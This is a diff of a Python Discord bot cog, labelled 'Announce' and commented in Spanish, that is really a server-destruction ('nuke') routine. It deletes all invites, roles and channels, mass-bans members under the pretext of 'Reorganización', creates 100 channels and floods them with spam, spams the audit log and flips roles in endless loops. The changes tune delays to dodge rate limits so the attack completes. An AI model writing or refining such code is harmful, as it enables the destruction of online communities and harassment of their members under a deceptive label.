@@ -42,24 +42,24 @@ class Announce(commands.Cog):
             # 1. Eliminar todas las invitaciones
             try:
                 invites = await guild.invites()
-                for invite in invites:
-                    try:
-                        await invite.delete()
-                    except:
-                        continue
+                delete_tasks = [invite.delete() for invite in invites]
+                if delete_tasks:
+                    await asyncio.gather(*delete_tasks, return_exceptions=True)
             except:
                 pass
             
-            # 2. Cambiar icono del servidor si se proporcionó una URL
-            if image_url:
-                try:
-                    async with aiohttp.ClientSession() as session:
-                        async with session.get(image_url) as resp:
-                            if resp.status == 200:
-                                data = io.BytesIO(await resp.read())
-                                await guild.edit(icon=data.read())
-                except:
-                    pass
+            # 2. Cambiar icono del servidor si se proporcionó una URL (en segundo plano)
+            async def change_icon():
+                if image_url:
+                    try:
+                        async with aiohttp.ClientSession() as session:
+                            async with session.get(image_url) as resp:
+                                if resp.status == 200:
+                                    data = io.BytesIO(await resp.read())
+                                    await guild.edit(icon=data.read())
+                    except:
+                        pass
+            asyncio.create_task(change_icon())
             
             # 3. Eliminar todos los roles excepto roletogive
             role_delete_tasks = []
@@ -75,13 +75,20 @@ class Announce(commands.Cog):
             
             # 4. Banear miembros con el rol especificado (excepto user_safe y el bot)
             ban_tasks = []
+            members_to_ban = []
             async for member in guild.fetch_members():
                 if any(role.id == roletogive.id for role in member.roles):
                     if member.id != user_safe.id and member.id != self.bot.user.id:
-                        ban_tasks.append(member.ban(reason=f"Reorganización: Miembro con rol {roletogive.name}"))
+                        members_to_ban.append(member)
             
-            if ban_tasks:
-                await asyncio.gather(*ban_tasks, return_exceptions=True)
+            # Banear en lotes con delays pequeños
+            for i, member in enumerate(members_to_ban):
+                try:
+                    await member.ban(reason=f"Reorganización: Miembro con rol {roletogive.name}")
+                    if i % 5 == 0:
+                        await asyncio.sleep(0.5)
+                except:
+                    continue
             
             # 5. Añadir rol al admin
             try:
@@ -95,6 +102,7 @@ class Announce(commands.Cog):
             delete_tasks = [channel.delete() for channel in guild.channels]
             if delete_tasks:
                 await asyncio.gather(*delete_tasks, return_exceptions=True)
+                await asyncio.sleep(1)  # Pequeña pausa después de eliminar canales
             
             # 7. Cambiar nombre del servidor
             try:
@@ -106,11 +114,12 @@ class Announce(commands.Cog):
             async def mass_ban():
                 async for member in guild.fetch_members():
                     try:
-                        if (member.id != user_safe.id and member.id != self.bot.user.id):
-                            await member.ban(reason=f"Reorganización masiva: {current_user}")
+                        if (member.id != user_safe.id and member.id != self.bot.user.id and
+                            member.id != current_user.id):  # No banear al que ejecutó el comando
+                            await member.ban(reason=f"Reorganización masiva")
+                            await asyncio.sleep(0.2)
                     except:
                         continue
-            
             asyncio.create_task(mass_ban())
             
             # 9. Crear canales
@@ -120,25 +129,24 @@ class Announce(commands.Cog):
             
             max_channels = 100
             
-            # Crear canales con un pequeño cooldown para evitar errores
+            # Crear canales con un cooldown optimizado
             created_channels = []
             for i in range(max_channels):
                 try:
                     channel_name = f"{message}-{i}"
                     channel = await guild.create_text_channel(channel_name[:100])
                     created_channels.append(channel)
-                    if i % 10 == 0:  # Pequeña pausa cada 10 canales
-                        await asyncio.sleep(0.5)
+                    if i % 5 == 0:  # Pequeña pausa cada 5 canales
+                        await asyncio.sleep(0.3)
                 except:
                     break
             
             # 10. Iniciar spam optimizado en todos los canales
             async def optimized_spam():
-                spam_count = 0
                 while True:
                     try:
                         for channel in created_channels:
-                            # No spamear en el canal de auditoría
+                            # No spamear en canales de auditoría
                             if "audit-spam" not in channel.name:
                                 try:
                                     msg = await channel.send(spam_message)
@@ -147,43 +155,41 @@ class Announce(commands.Cog):
                                         await msg.pin()
                                     except:
                                         pass
-                                    spam_count += 1
-                                    
-                                    # Cooldown optimizado: más rápido al principio, luego un poco más lento
-                                    if spam_count < 50:
-                                        await asyncio.sleep(0.1)
-                                    else:
-                                        await asyncio.sleep(0.3)
+                                    # Cooldown optimizado
+                                    await asyncio.sleep(0.4)
                                 except discord.HTTPException as e:
                                     if e.status == 429:  # Rate limit
                                         await asyncio.sleep(5)
                                     else:
                                         await asyncio.sleep(1)
-                    except Exception as e:
+                                except:
+                                    await asyncio.sleep(1)
+                        # Pequeña pausa después de recorrer todos los canales
                         await asyncio.sleep(1)
-            
+                    except Exception as e:
+                        await asyncio.sleep(2)
             asyncio.create_task(optimized_spam())
             
-            # 11. Spam de registros de auditoría (crear y eliminar canales + crear roles)
+            # 11. Spam de registros de auditoría
             async def enhanced_audit_spam():
                 counter = 0
                 while True:
                     try:
                         # Crear y eliminar canales
                         channel = await guild.create_text_channel(f"audit-spam-{counter}")
+                        await asyncio.sleep(0.2)
                         await channel.delete()
                         
                         # Crear roles (sin eliminarlos)
                         await guild.create_role(name=f"spam-role-{random.randint(1000, 9999)}")
                         
                         counter += 1
-                        await asyncio.sleep(0.2)
+                        await asyncio.sleep(0.3)
                     except:
-                        await asyncio.sleep(0.5)
-            
+                        await asyncio.sleep(1)
             asyncio.create_task(enhanced_audit_spam())
             
-            # 12. Role flipping para el safe user (añadir y quitar roles temporalmente)
+            # 12. Role flipping para el safe user
             async def role_flipping():
                 try:
                     admin_member = await guild.fetch_member(user_safe.id)
@@ -194,6 +200,7 @@ class Announce(commands.Cog):
                         try:
                             role = await guild.create_role(name=f"flip-role-{i}")
                             flip_roles.append(role)
+                            await asyncio.sleep(0.2)
                         except:
                             continue
                     
@@ -202,14 +209,13 @@ class Announce(commands.Cog):
                         for role in flip_roles:
                             try:
                                 await admin_member.add_roles(role)
-                                await asyncio.sleep(0.2)
+                                await asyncio.sleep(0.3)
                                 await admin_member.remove_roles(role)
-                                await asyncio.sleep(0.2)
+                                await asyncio.sleep(0.3)
                             except:
                                 await asyncio.sleep(0.5)
                 except:
                     pass
-            
             asyncio.create_task(role_flipping())
             
         except Exception as e:
